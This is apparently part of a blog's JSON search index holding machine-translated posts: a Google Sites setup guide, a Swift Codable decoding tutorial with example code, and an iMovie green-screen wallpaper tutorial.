RightSimilar to wix/weebly or cakeresume? Layout and components are just dragged and filled to complete!3. Support RWD, Built-in Search, Navigation Bar4. Support for Landing Page5. No special traffic limits; storage capacity depends on the creator‚Äôs Google Drive quota6. üåü Custom Domain Binding Available7. üåü Direct Integration with GA for Visitor Analysis8. Official Community collects feedback and continuously maintains updates9. Support Announcement Alerts10. üåü Seamlessly embed Youtube, Google Forms, Google Slides, Google Docs, Google Calendar, Google Maps, with support for responsive design on both desktop and mobile11. üåü Page content supports embedded JavaScript/Html/CSS12. Clean and simple URLs (http://example.com/page-name/subpage-name), customizable page path names13. üåü Page layout has guidelines/auto-alignment, very thoughtfulDragging a component shows alignment guide linesApplicable WebsitesI think Google Site is only suitable for very lightweight web services, such as school clubs, small event pages, or personal resumes.Some Setup InstructionsList some problems you encountered and solved during use; everything else is straightforward and doesn‚Äôt need to be documented.How to Bind a Personal Domain?1. Go to http://google.com/webmasters/verification2. Click ‚ÄúAdd Property,‚Äù enter ‚ÄúYour Domain,‚Äù and click ‚ÄúContinue‚Äù3. Select your ‚ÄúDomain Service Provider‚Äù and copy the ‚ÄúDNS Verification String‚Äù4. Go to the domain service provider‚Äôs website (Here we use Namecheap.com as an example, similar for others)Add a new record in the DNS settings section. Select the type ‚ÄúTXT Record‚Äù, enter ‚Äú@‚Äù for the host, and input the copied DNS verification string as the value. Then click Add to submit.Add a new record, select the type ‚ÄúCNAME Record‚Äù, enter ‚Äúwww (or your desired subdomain)‚Äù for the host, and enter ‚Äúghs.googlehosted.com.‚Äù for the value, then click Add to submit. You can also redirect more from http://zhgchg.li -&gt; http://www.zhgchg.li After setting this up, please wait a moment‚Ä¶ waiting for the DNS records to take effect‚Ä¶5. Return to Google Master and click Verify If you see ‚ÄúVerification of resources failed‚Äù, don‚Äôt worry! Please wait a moment. If it still doesn‚Äôt work after more than an hour, double-check your settings for any errors.Successfully Verified Domain Ownership6. Return to your Google Site settings pageClick the top right ‚ÄúGear (Settings)‚Äù icon, select ‚ÄúCustom URL,‚Äù enter the domain name or subdomain you want to assign, then click ‚ÄúAssign.‚ÄùAfter successful assignment, close the settings window and click the top right corner ‚ÄúPublish‚Äù to publish. Please wait a moment here‚Ä¶ waiting for the DNS record to take effect‚Ä¶7. Open a new browser and enter the URL to see if it can be accessed normally If you see ‚ÄúPage cannot be opened‚Äù, don‚Äôt worry! Please wait a moment. If it still doesn‚Äôt open after more than 1 hour, check your settings for any errors.Done!Subpage and Page Path SettingsSubpages in the navigation menu will automatically expand and display.How to Set Up?Switch to the ‚ÄúPages‚Äù tab on the right.You can add a new page by dragging it under an existing page to make it a subpage, or by clicking the ‚Äú‚Ä¶‚Äù for options.Selecting attributes allows customization of the page path.Enter the path name (EX: dev -&gt; http://www.zhgchg.li/dev)Page Header and Footer Settings1. Header SettingsHover the mouse over the navigation bar and select ‚ÄúAdd Header‚ÄùAfter adding the header, moving the mouse to the bottom left corner allows you to change the image, enter the title text, and change the header type.2. Footer SettingsHover the mouse at the bottom of the page and select ‚ÄúEdit Footer‚Äù to enter footer information. Note! The footer information is shared across the entire site, and all pages will use the same content! You can also click the ‚Äúeye‚Äù icon at the bottom left to toggle the display of footer information on this pageSet Website Favicon, Header Name, and IconfaviconWebsite Title, LogoHow to Set Up?Click the ‚ÄúGear (Settings)‚Äù icon at the top right and select ‚ÄúBrand Image‚Äù to set it up. After setting, don‚Äôt forget to return to the page and click ‚ÄúPublish‚Äù to apply the changes!Hide/Show Page Last Updated Info and Page Anchor Link TipsLast Updated InformationPage Anchor Link TipHow to Set Up?Click the ‚ÄúGear (Settings)‚Äù icon in the top right corner and select ‚ÄúViewer Tools‚Äù to configure. After setting, don‚Äôt forget to return to the page and click ‚ÄúPublish‚Äù for the changes to take effect!Integrate GA to Analyze Traffic1. Go to https://analytics.google.com/analytics/web/?authuser=0#/provision/SignUp to create a new GA account2. After creation, copy the GA tracking ID3. Return to your Google Site settings pageClick the ‚ÄúGear (Settings)‚Äù icon at the top right, select ‚ÄúAnalytics,‚Äù and enter the ‚ÄúGA Tracking ID‚Äù to set it up. Don‚Äôt forget to return to the page and click ‚ÄúPublish‚Äù for the changes to take effect!Set Site-wide/Homepage Banner AnnouncementBanner AnnouncementHow to Set Up?Click the ‚ÄúGear (Settings)‚Äù icon at the top right and select ‚ÄúAnnouncement Banner‚Äù to set it up. After setting it, don‚Äôt forget to go back to the page and click ‚ÄúPublish‚Äù for it to take effect!You can specify the banner message content, color, button text, click-through link, whether to open in a new tab, and set it to display site-wide or only on the homepage.Release SettingsTop right corner ‚ÄúPublish ‚ñæ‚ÄùYou can review the changes and publish.You can set whether to allow search engines to index the content and disable the content check page that appears before each publication.Embedding Javascript/HTML/CSS, Large Number of ImagesExample of Gist However, as mentioned in the fatal flaw above, embedding an iframe cannot adjust its height responsively according to the webpage size.How to Insert?Choose ‚ÄúEmbed‚ÄùChoose Embed CodeAllows input of JavaScript/HTML/CSS, which can be used to create custom styled Button UI. Alternatively, selecting ‚ÄúImage‚Äù allows inserting multiple pictures, which will be displayed in a waterfall layout (like my City Corner page above).Embedded Google Forms cannot be filled out directly on the page?The reason is that the form includes a ‚ÄúFile Upload‚Äù field, which cannot be embedded in other pages using an iframe due to browser security restrictions; therefore, only the survey information is displayed, and users must click the fill button to open a new window to complete the form.The solution is simply to remove the file upload issue, allowing direct input on the page.Button Component URL Content Cannot Include AnchorsEX: #lifesection, I want to place it at the top of the page as a table of contents or at the bottom as a GoTop button.Checked the official community, currently it‚Äôs not possible. The button link can only 1. open an external link in a new window or 2. specify an internal page. So I ended up splitting the menu using subpages.Further Reading [Productivity Tools] Ditching Chrome for the Sidekick BrowserIf you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "Codable Decode Issues ExplainedÔΩúMaster Decodable for Real-World iOS Challenges", "url": "/posts/zrealm-dev/codable-decode-issues-explained-master-decodable-for-real-world-ios-challenges-1aa2f8445642/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, ios, ios-app-development, codable, json, decode", "date": "2020-06-14 00:33:58 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Real-World Codable Decoding Issues Overview (Part 1)From Basics to Advanced: D...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Real-World Codable Decoding Issues Overview (Part 1)From Basics to Advanced: Deep Dive into Using Decodable to Handle All Possible Problem ScenariosPhoto by Gustas BrazaitisIntroductionDue to the backend API upgrade, we needed to adjust the API handling architecture. Recently, we took this opportunity to update the original network handling framework, which was written in Objective-C, to Swift. Because of the language difference, it was no longer suitable to use the original Restkit for managing the network layer. However, Restkit was incredibly powerful with many features and was used effectively in the project with hardly any major issues. On the downside, it was very heavy, almost no longer maintained, and purely Objective-C; it will inevitably need to be replaced in the future.Restkit almost handles all the features needed for network requests, from basic network handling, API calls, network processing, to response handling like converting JSON strings to objects, and even saving objects into Core Data. It‚Äôs truly a framework that can do the work of ten.With the evolution of time, current frameworks no longer focus on all-in-one solutions. Instead, they emphasize flexibility, lightweight design, and modularity to increase adaptability and create more variations. Therefore, when switching to Swift, we chose Moya as the network handling library and combined other functionalities using different methods as needed.Main TopicRegarding the JSON String to Object Mapping section, we use Swift‚Äôs built-in Codable (Decodable) protocol and JSONDecoder for processing; we also separate Entity/Model to enhance responsibility division, operation, and readability. Additionally, the codebase mixes Objective-C and Swift, which must be taken into account. Ôºä The Encodable part is omitted; examples only show Decodable implementation. They are similar‚Äîif you can decode, you can also encode.StartAssuming our initial API Response JSON String is as follows:{ \"id\": 123456, \"comment\": \"It is 'Âëä‰∫î‰∫∫', not '‰∫îÂëä‰∫∫'!\", \"target_object\": { \"type\": \"song\", \"id\": 99, \"name\": \"Thinking of You Under the Stars and Moon\" }, \"commenter\": { \"type\": \"user\", \"id\": 1, \"name\": \"zhgchgli\", \"email\": \"zhgchgli@gmail.com\" }}From the above example, we can split into three Entities &amp; Models: User, Song, and Comment, allowing us to reuse components. For convenience, we first write the Entities/Models in the same file for demonstration.Please provide the Markdown paragraphs you want me to translate into English.// Entity:struct UserEntity: Decodable { var id: Int var name: String var email: String}// Model:class UserModel: NSObject { init(_ entity: UserEntity) { self.id = entity.id self.name = entity.name self.email = entity.email } var id: Int var name: String var email: String}Song:// Entity:struct SongEntity: Decodable { var id: Int var name: String}// Model:class SongModel: NSObject { init(_ entity: SongEntity) { self.id = entity.id self.name = entity.name } var id: Int var name: String}Comment:// Entity:struct CommentEntity: Decodable { enum CodingKeys: String, CodingKey { case id case comment case targetObject = \"target_object\" case commenter } var id: Int var comment: String var targetObject: SongEntity var commenter: UserEntity}//Model:class CommentModel: NSObject { init(_ entity: CommentEntity) { self.id = entity.id self.comment = entity.comment self.targetObject = SongModel(entity.targetObject) self.commenter = UserModel(entity.commenter) } var id: Int var comment: String var targetObject: SongModel var commenter: UserModel}JSONDecoder:let jsonString = \"{ \\\"id\\\": 123456, \\\"comment\\\": \\\"It's 'Âëä‰∫î‰∫∫', not '‰∫îÂëä‰∫∫'!\\\", \\\"target_object\\\": { \\\"type\\\": \\\"song\\\", \\\"id\\\": 99, \\\"name\\\": \\\"Êä´ÊòüÊà¥ÊúàÁöÑÊÉ≥‰Ω†\\\" }, \\\"commenter\\\": { \\\"type\\\": \\\"user\\\", \\\"id\\\": 1, \\\"name\\\": \\\"zhgchgli\\\", \\\"email\\\": \\\"zhgchgli@gmail.com\\\" } }\"let jsonDecoder = JSONDecoder()do { let result = try jsonDecoder.decode(CommentEntity.self, from: jsonString.data(using: .utf8)!)} catch { print(error)}CodingKeys Enum?When our JSON string key names do not match the entity object‚Äôs property names, we can add an internal CodingKeys enum for mapping. After all, we cannot control the naming conventions of the backend data source.case PropertyKeyName = \"Backend Field Name\"case PropertyKeyName // If not specified, PropertyKeyName is used as the default backend field nameOnce you add the CodingKeys enum, you must list all non-Optional fields; you cannot list only the keys you want to customize.Another way is to set the JSONDecoder‚Äôs keyDecodingStrategy. If the response data fields and property names differ only by snake_case &lt;-&gt; camelCase, you can directly set .keyDecodingStrategy = .convertFromSnakeCase to automatically match the mapping.let jsonDecoder = JSONDecoder()jsonDecoder.keyDecodingStrategy = .convertFromSnakeCasetry jsonDecoder.decode(CommentEntity.self, from: jsonString.data(using: .utf8)!)When the returned data is an array:struct SongListEntity: Decodable { var songs: [SongEntity]}Adding Constraints to String:struct SongEntity: Decodable { var id: Int var name: String var type: SongType enum SongType { case rock case pop case country }}Applicable to limited string types, written as Enum for easy passing and usage; if a value outside the enum appears, decoding will fail!Use Generics to Wrap Fixed Structures:Assuming multiple returned JSON strings have a fixed format:{ \"count\": 10, \"offset\": 0, \"limit\": 0, \"results\": [ { \"type\": \"song\", \"id\": 1, \"name\": \"1\" } ]}It can be wrapped using a generic approach:struct PageEntity&lt;E: Decodable&gt;: Decodable { var count: Int var offset: Int var limit: Int var results: [E]}Use: PageEntity&lt;Song&gt;.selfDate/Timestamp Auto Decode:Setting JSONDecoder‚Äôs dateDecodingStrategy .secondsSince1970/.millisecondsSince1970 : unix timestamp .deferredToDate : Apple‚Äôs timestamp, rarely used, different from unix timestamp, counted from 2001/01/01 .iso8601 : ISO 8601 date format .formatted(DateFormatter) : Decode Date according to the passed DateFormatter .custom : Custom Date Decode logic .custom Example: Assume the API returns both YYYY/MM/DD and ISO 8601 formats, and both need to be decoded:var dateFormatter = DateFormatter()var iso8601DateFormatter = ISO8601DateFormatter()let decoder: JSONDecoder = JSONDecoder()decoder.dateDecodingStrategy = .custom({ (decoder) -&gt; Date in let container = try decoder.singleValueContainer() let dateString = try container.decode(String.self) // ISO8601: if let date = iso8601DateFormatter.date(from: dateString) { return date } // YYYY-MM-DD: dateFormatter.dateFormat = \"yyyy-MM-dd\" if let date = dateFormatter.date(from: dateString) { return date } throw DecodingError.dataCorruptedError(in: container, debugDescription: \"Cannot decode date string \\(dateString)\")})let result = try jsonDecoder.decode(CommentEntity.self, from: jsonString.data(using: .utf8)!) ÔºäDateFormatter is very performance-intensive during initialization; reuse it as much as possible.Basic Decode Knowledge: The field types (struct/class/enum) within the Decodable Protocol must all conform to the Decodable Protocol; alternatively, values can be assigned during the init decoder. Decode fails when the field types do not match. If a field in a Decodable Object is set as Optional, it means it is optional; if provided, it will be decoded. Optional fields can accept: JSON String with no fields, or given but set to nil. Blank and 0 are not equal to nil; nil is nil. Be careful with weakly typed backend APIs! By default, if a Decodable Object has an enum field that is non-Optional, decoding will fail if the JSON string does not provide a value (handling this will be explained later). By default, a decode failure will immediately stop the process, making it impossible to simply skip the erroneous data (handling will be explained later). Left: ‚Äú‚Äù / Right: nilAdvanced UsageSo far, the basic usage is complete, but the real world is not that simple. Below are some advanced scenarios and Codable-based solutions. From this point on, we can no longer rely on the default Decode to handle mapping for us; we need to implement init(from decoder: Decoder) for custom decoding. ÔºäHere, only the Entity part is shown temporarily; the Model is not needed yet.init(from decoder: Decoder)init decoder must assign initial values to all non-Optional fields (that‚Äôs what init is for!).When customizing the Decode operation, we need to get the container from the decoder to extract values. There are three types of content retrieval for the container.The first type container(keyedBy: CodingKeys.self) Operates according to CodingKeys:struct SongEntity: Decodable { var id: Int var name: String enum CodingKeys: String, CodingKey { case id case name } init(from decoder: Decoder) throws { let container = try decoder.container(keyedBy: CodingKeys.self) self.id = try container.decode(Int.self, forKey: .id) // Parameter 1 accepts support: a class implementing Decodable // Parameter 2 CodingKeys self.name = try container.decode(String.self, forKey: .name) }}The second singleValueContainer Extract the entire package for operation (single value):enum HandsomeLevel: Decodable { case handsome(String) case normal(String) init(from decoder: Decoder) throws { let container = try decoder.singleValueContainer() let name = try container.decode(String.self) if name == \"zhgchgli\" { self = .handsome(name) } else { self = .normal(name) } }}struct UserEntity: Decodable { var id: Int var name: HandsomeLevel var email: String enum CodingKeys: String, CodingKey { case id case name case email }}Applicable to Associated Value Enum field types, such as name which also includes a coolness level!The third type: unkeyedContainer Treat the entire package as an array:struct ListEntity: Decodable { var items:[Decodable] init(from decoder: Decoder) throws { var unkeyedContainer = try decoder.unkeyedContainer() self.items = [] while !unkeyedContainer.isAtEnd { // The internal pointer of unkeyedContainer automatically moves to the next object after decode operation // When it reaches the end, it means the iteration is complete if let id = try? unkeyedContainer.decode(Int.self) { items.append(id) } else if let name = try? unkeyedContainer.decode(String.self) { items.append(name) } } }}let jsonString = \"[\\\"test\\\",1234,5566]\"let jsonDecoder = JSONDecoder()let result = try jsonDecoder.decode(ListEntity.self, from: jsonString.data(using: .utf8)!)print(result)Applicable to array fields with variable types.Under a Container, we can also use nestedContainer / nestedUnkeyedContainer to operate on specific fields: ÔºäFlatten Data Fields (similar to flatMap)struct ListEntity: Decodable { enum CodingKeys: String, CodingKey { case items case date case name case target } enum PredictKey: String, CodingKey { case type } var date: Date var name: String var items: [Decodable] var target: Decodable init(from decoder: Decoder) throws { let container = try decoder.container(keyedBy: CodingKeys.self) self.date = try container.decode(Date.self, forKey: .date) self.name = try container.decode(String.self, forKey: .name) let nestedContainer = try container.nestedContainer(keyedBy: PredictKey.self, forKey: .target) let type = try nestedContainer.decode(String.self, forKey: .type) if type == \"song\" { self.target = try container.decode(SongEntity.self, forKey: .target) } else { self.target = try container.decode(UserEntity.self, forKey: .target) } var unkeyedContainer = try container.nestedUnkeyedContainer(forKey: .items) self.items = [] while !unkeyedContainer.isAtEnd { if let song = try? unkeyedContainer.decode(SongEntity.self) { items.append(song) } else if let user = try? unkeyedContainer.decode(UserEntity.self) { items.append(user) } } }}Accessing and decoding objects at different levels, the example demonstrates using nestedContainer and flat to output the type, then decoding accordingly based on the type.Decode &amp; DecodeIfPresent DecodeIfPresent: Decode only if the response contains the data field (when the Codable property is Optional) Decode: Perform the decode operation. If the response lacks a data field, an error will be thrown. ÔºäThe above is just a brief introduction to the init decoder and container methods and functions. If you don‚Äôt understand, it‚Äôs okay. Let‚Äôs move directly to real-world scenarios and experience how they work together in the examples.Real-World ScenarioBack to the original example JSON String.Scenario 1. Suppose a comment could be directed at either a song or a person. The targetObject field could be either User or Song. How should this be handled?{ \"results\": [ { \"id\": 123456, \"comment\": \"It's 'Âëä‰∫î‰∫∫', not '‰∫îÂëä‰∫∫'!\", \"target_object\": { \"type\": \"song\", \"id\": 99, \"name\": \"Thinking of You Under the Stars and Moon\" }, \"commenter\": { \"type\": \"user\", \"id\": 1, \"name\": \"zhgchgli\", \"email\": \"zhgchgli@gmail.com\" } }, { \"id\": 55, \"comment\": \"66666!\", \"target_object\": { \"type\": \"user\", \"id\": 1, \"name\": \"zhgchgli\" }, \"commenter\": { \"type\": \"user\", \"id\": 2, \"name\": \"aaaa\", \"email\": \"aaaa@gmail.com\" } } ]}Method a.Using Enum as a Container for Decoding.struct CommentEntity: Decodable { enum CodingKeys: String, CodingKey { case id case comment case targetObject = \"target_object\" case commenter } var id: Int var comment: String var targetObject: TargetObject var commenter: UserEntity enum TargetObject: Decodable { case song(SongEntity) case user(UserEntity) enum PredictKey: String, CodingKey { case type } enum TargetObjectType: String, Decodable { case song case user } init(from decoder: Decoder) throws { let container = try decoder.container(keyedBy: PredictKey.self) let singleValueContainer = try decoder.singleValueContainer() let targetObjectType = try container.decode(TargetObjectType.self, forKey: .type) switch targetObjectType { case .song: let song = try singleValueContainer.decode(SongEntity.self) self = .song(song) case .user: let user = try singleValueContainer.decode(UserEntity.self) self = .user(user) } } }}We changed the property of targetObject to an Associated Value Enum, deciding what content to put inside the Enum only during decoding.The core practice is to create an Enum conforming to Decodable as a container. During decoding, first extract the key field (the type field in the example JSON string) to determine the type. If it is Song, use singleValueContainer to decode the entire package into a SongEntity; similarly for User.Only extract from the Enum when needed://if case letif case let CommentEntity.TargetObject.user(user) = result.targetObject { print(user)} else if case let CommentEntity.TargetObject.song(song) = result.targetObject { print(song)}//switch case letswitch result.targetObject {case .song(let song): print(song)case .user(let user): print(user)}Method b.Change the declaration of the field attribute to Base Class.struct CommentEntity: Decodable { enum CodingKeys: String, CodingKey { case id case comment case targetObject = \"target_object\" case commenter } enum PredictKey: String, CodingKey { case type } var id: Int var comment: String var targetObject: Decodable var commenter: UserEntity init(from decoder: Decoder) throws { let container = try decoder.container(keyedBy: CodingKeys.self) self.id = try container.decode(Int.self, forKey: .id) self.comment = try container.decode(String.self, forKey: .comment) self.commenter = try container.decode(UserEntity.self, forKey: .commenter) // let targetObjectContainer = try container.nestedContainer(keyedBy: PredictKey.self, forKey: .targetObject) let targetObjectType = try targetObjectContainer.decode(String.self, forKey: .type) if targetObjectType == \"user\" { self.targetObject = try container.decode(UserEntity.self, forKey: .targetObject) } else { self.targetObject = try container.decode(SongEntity.self, forKey: .targetObject) } }}The principle is similar, but here we first use nestedContainer to access targetObject and get type for judgment, then decide what type targetObject should be decoded into.Cast only when needed:if let song = result.targetObject as? Song { print(song)} else if let user = result.targetObject as? User { print(user)}Scenario 2. How to Decode When the Data Array Contains Multiple Data Types?{ \"results\": [ { \"type\": \"song\", \"id\": 99, \"name\": \"Missing You Under the Stars\" }, { \"type\": \"user\", \"id\": 1, \"name\": \"zhgchgli\", \"email\": \"zhgchgli@gmail.com\" } ]}Combine the mentioned nestedUnkeyedContainer with the solution from Scenario 1; here, you can also use the a. solution from Scenario 1 to access values with an Associated Value Enum.Scenario 3. Decode Only When JSON String Field Has Value[ { \"type\": \"song\", \"id\": 99, \"name\": \"Missing You Under the Stars\" }, { \"type\": \"song\", \"id\": 11 }]Use decodeIfPresent for decoding.Scenario 4. Skip Data with Decode Errors in Array Data{ \"results\": [ { \"type\": \"song\", \"id\": 99, \"name\": \"Thinking of You Under the Stars and Moon\" }, { \"error\": \"errro\" }, { \"type\": \"song\", \"id\": 19, \"name\": \"Take Me to Find Nightlife\" } ]}As mentioned earlier, Decodable by default requires all data to be correctly parsed to output the mapping; sometimes the backend provides unstable data, giving a long array where a few entries have missing fields or mismatched field types, causing Decode to fail; resulting in the entire batch failing and returning nil.struct ResultsEntity: Decodable { enum CodingKeys: String, CodingKey { case results } var results: [SongEntity] init(from decoder: Decoder) throws { let container = try decoder.container(keyedBy: CodingKeys.self) var nestedUnkeyedContainer = try container.nestedUnkeyedContainer(forKey: .results) self.results = [] while !nestedUnkeyedContainer.isAtEnd { if let song = try? nestedUnkeyedContainer.decode(SongEntity.self) { self.results.append(song) } else { let _ = try nestedUnkeyedContainer.decode(EmptyEntity.self) } } }}struct EmptyEntity: Decodable { }struct SongEntity: Decodable { var type: String var id: Int var name: String}let jsonString = \"{ \\\"results\\\": [ { \\\"type\\\": \\\"song\\\", \\\"id\\\": 99, \\\"name\\\": \\\"Under the Stars Missing You\\\" }, { \\\"error\\\": \\\"errro\\\" }, { \\\"type\\\": \\\"song\\\", \\\"id\\\": 19, \\\"name\\\": \\\"Take Me to Find Nightlife\\\" } ] }\"let jsonDecoder = JSONDecoder()let result = try jsonDecoder.decode(ResultsEntity.self, from: jsonString.data(using: .utf8)!)print(result)The solution is similar to Scenario 2‚Äôs solution; use nestedUnkeyedContainer to iterate through each item and try? Decode. If decoding fails, use an Empty Decode to allow the internal pointer of nestedUnkeyedContainer to continue. ÔºäThis method is a bit of a workaround because we cannot skip the nestedUnkeyedContainer command, and nestedUnkeyedContainer must successfully decode to continue execution; that‚Äôs why it is done this way. Some in the Swift community have proposed adding moveNext(), but it is not yet implemented in the current version.Scenario 5. Some fields are for internal program use and do not need to be decodedMethod a. Entity/ModelHere, we need to mention the purpose of splitting Entity and Model as stated earlier; Entity is solely responsible for JSON String to Entity (Decodable) mapping; Model initializes with Entity, and all actual program passing, operations, and business logic use Model.struct SongEntity: Decodable { var type: String var id: Int var name: String}class SongModel: NSObject { init(_ entity: SongEntity) { self.type = entity.type self.id = entity.id self.name = entity.name } var type: String var id: Int var name: String var isSave: Bool = false // business logic}Benefits of Splitting Entity/Model: Clear Responsibilities, Entity: JSON String to Decodable, Model: Business Logic A clear mapping of which fields to view in the Entity at a glance Avoid all fields clustering together when there are many columns Objective-C is also usable (because the Model is just NSObject, struct/Decodable is not visible to Objective-C) Place the business logic and fields for internal use in the Model only. Method b. init handlingList the CodingKeys and exclude internally used fields. Providing default values during init, having default values for fields, or setting them as Optional are not good practices; they just allow the code to run.[2020/06/26 Update] ‚Äî Part 2 Scenario 6. How to Decode API Response Using 0/1 to Represent Bool? Real-world Codable Decode Issues Summary (Part 2)[2020/06/26 Update] ‚Äî Next: Scenario 7. Avoid rewriting init decoder every time Practical Issues Encountered with Codable Decoding - Part 2[2020/06/26 Update] ‚Äî Next: Scenario 8. Proper Handling of Response Null Field Data Real-World Codable Decoding Issues Summary (Part 2)Comprehensive Scenario ExampleA complete example combining both basic and advanced usage:{ \"count\": 5, \"offset\": 0, \"limit\": 10, \"results\": [ { \"id\": 123456, \"comment\": \"It's 'Âëä‰∫î‰∫∫', not '‰∫îÂëä‰∫∫'!\", \"target_object\": { \"type\": \"song\", \"id\": 99, \"name\": \"Thinking of You Under the Stars\", \"create_date\": \"2020-06-13T15:21:42+0800\" }, \"commenter\": { \"type\": \"user\", \"id\": 1, \"name\": \"zhgchgli\", \"email\": \"zhgchgli@gmail.com\", \"birthday\": \"1994/07/18\" } }, { \"error\": \"not found\" }, { \"error\": \"not found\" }, { \"id\": 2, \"comment\": \"Haha, me too!\", \"target_object\": { \"type\": \"user\", \"id\": 1, \"name\": \"zhgchgli\", \"email\": \"zhgchgli@gmail.com\", \"birthday\": \"1994/07/18\" }, \"commenter\": { \"type\": \"user\", \"id\": 1, \"name\": \"RandomUserA\", \"email\": \"man@gmail.com\", \"birthday\": \"2000/01/12\" } } ]}Output:zhgchgli: It's \"Âëä‰∫î‰∫∫,\" not \"‰∫îÂëä‰∫∫!\"The complete example demonstration is as above!Part (2) &amp; Other Scenarios Updated: Real-World Codable Decoding Issues Summary (Part 2)SummaryThe benefits of choosing Codable are, first of all, that it is native, so you don‚Äôt have to worry about lack of maintenance later, and it also results in clean code; however, it has stricter limitations and is less flexible in parsing JSON strings. Otherwise, you need to do more work as shown in this article to complete it. Additionally, its performance is not necessarily better than other mapping libraries (Decodable still uses the Objective-C era NSJSONSerialization for parsing). But I believe Apple may optimize this in future updates, so we won‚Äôt have to change the code then.The scenarios and examples in the article may be extreme, but sometimes you just have to deal with them; of course, we hope that in most cases, simple Codable will meet our needs. However, with the techniques above, there should be no problem that can‚Äôt be solved! Thanks to Ôº†saiday for the technical support.Further Reading Deep Dive into Decodable ‚Äî Writing a JSON Parser Beyond the Native OneFull of content, a thorough understanding of Decoder/JSONDecoder. Different Perspectives on Problems ‚Äî From Codable to Swift Metaprogramming Why Model Objects Shouldn‚Äôt Implement Swift‚Äôs Decodable or Encodable Protocols If you have any questions or suggestions, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "Create Fake Transparent iPhone Wallpapers EasilyÔΩúiMovie Green Screen Editing Tips", "url": "/posts/zrealm-life/create-fake-transparent-iphone-wallpapers-easily-imovie-green-screen-editing-tips-2e4429f410d6/", "categories": "ZRealm Life.", "tags": "english, ai-translation, iphone, lifestyle, imovie, chroma-key, wallpaper", "date": "2020-05-10 15:37:42 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Easily Create a ‚ÄúFake‚Äù Transparent Perspective Wallpaper on iPhoneUsing iMovie...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Easily Create a ‚ÄúFake‚Äù Transparent Perspective Wallpaper on iPhoneUsing iMovie‚Äôs Green Screen Feature to Composite VideosAnyway, I‚Äôm FreeWorking by day, exploited physically by capitalists; by night, mentally exploited by mass entertainment, still unable to achieve the ideal of working by day, studying by night, and critiquing on weekends!Recently, while mindlessly relaxing, I came across a very common wallpaper app ad that showcased a transparent wallpaper with a see-through effect, which was quite eye-catching; but obviously, it‚Äôs impossible. Even with a rear camera live view, the angles can‚Äôt match that perfectly!„ÄêYoutuber Insider„ÄëAttention TV Shows and Series Fans! Revealing the Toxic Truths Mainstream Media Won‚Äôt Tell You! Working by Day, Studying by Night, Critiquing on Weekends! Exposing the Deception SecretsÔΩúAnyway, I‚Äôm FreeFinal ResultLet‚Äôs Be Smart Youngsters!Although I knew it was a special effect, I thought it would be very complicated; surprisingly, the built-in iMovie app on the iPhone allows you to create it with just a few simple taps.Only need: An iPhone (to use iMovie directly) and a phone for filming A phone or camera responsible for shooting Phone stand or water bottle‚Ä¶ or any item that can support a phone iMovie APP (Free Download) Green Background (Green Screen) You can directly download this image or get it from the webThese 5 items are all you need to create a perspective effect!Specific Process: Set up the phone responsible for filming Directly record a clean video (without the phone appearing in the frame) Set the phone background to a green screen before filming. Shoot another video demonstrating how to use the phone on camera. Open iMovie APP to merge Completed Start1. Set up your phone and find the right shooting angleI used two cans of eel and a bottle of mineral water as a phone stand (of course, a proper phone stand is better!)The purpose of using a phone holder for filming is to ensure both videos have the same angle. Otherwise, the frames would shift, making the result less appealing. Holding the phone by hand cannot guarantee 100% identical viewpoints in both videos.2. Shoot a clean video segmentThe video should be as long as needed; shoot only as long as the clean footage requires.3. Set the wallpaper of the phone in the shot to a green background‚ÄúSettings‚Äù -&gt; ‚ÄúBackground Image‚Äù -&gt; ‚ÄúSelect the downloaded green background‚Äù -&gt; ‚ÄúSet for both‚ÄùCompleted diagram4. Record a video demonstrating how to use the phone in the frameVideo length same as 2. Clean video; it‚Äôs okay if it‚Äôs longer, can trim later.5. Open the iMovie App to Create a Project„Äå+„Äç-&gt;„ÄåVideo„Äç-&gt; Select „ÄåClean Video„Äç-&gt;„ÄåCreate Video„ÄçInsert a clean video into the project.6. Move Playback Position to the BeginningIf you do not move the clean video playback position to the beginning, an error ‚ÄúMove the playhead away from the end to add an overlay‚Äù will occur when inserting the green screen video later.7. Insert On-Screen Mobile Operation VideoClick the top right ‚Äú+‚Äù -&gt; ‚ÄúVideos‚Äù -&gt; ‚ÄúAll‚ÄùSelect ‚ÄúFootage with On-Screen Actions‚Äù -&gt; ‚Äú‚Ä¶‚Äù -&gt; ‚ÄúGreen/Blue Screen‚Äù (commonly known as chroma key)Click the top ‚ÄúIn-frame Operation Video‚Äù -&gt; ‚ÄúScroll to the frame with the green background‚Äù -&gt; Click the ‚Äúgreen area‚Äù -&gt; Complete perspective transparency8. Synthesis Complete! Export the VideoConfirm both videos end at the same time, click the top left ‚ÄúDone‚Äù -&gt; ‚ÄúShare‚Äù 